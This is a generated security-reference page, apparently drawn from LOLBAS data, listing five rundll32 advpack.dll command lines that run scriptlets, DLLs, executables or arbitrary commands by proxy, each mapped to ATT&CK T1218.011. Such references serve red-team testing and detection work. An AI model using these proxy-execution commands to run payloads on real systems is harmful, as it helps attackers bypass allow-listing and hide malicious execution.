---
parsed_by: focuslocust
source: commands
type: generated
---
# Advpack.dll Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Advpack.dll

Tool page: [Advpack.dll](../../tools/windows/advpack.dll.md)

### Run local or remote script(let) code through INF file specification.

```text
rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,
```

Description:

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Advpack.yml` |
| Evidence | Command preserved from source parser. |

### Run local or remote script(let) code through INF file specification.

```text
rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,
```

Description:

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Advpack.yml` |
| Evidence | Command preserved from source parser. |

### Load a DLL payload.

```text
rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}
```

Description:

Launch a DLL payload by calling the RegisterOCX function.

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Advpack.yml` |
| Evidence | Command preserved from source parser. |

### Run an executable payload.

```text
rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}
```

Description:

Launch an executable by calling the RegisterOCX function.

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Advpack.yml` |
| Evidence | Command preserved from source parser. |

### Run an executable payload.

```text
rundll32 advpack.dll, RegisterOCX {CMD}
```

Description:

Launch command line by calling the RegisterOCX function.

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Advpack.yml` |
| Evidence | Command preserved from source parser. |
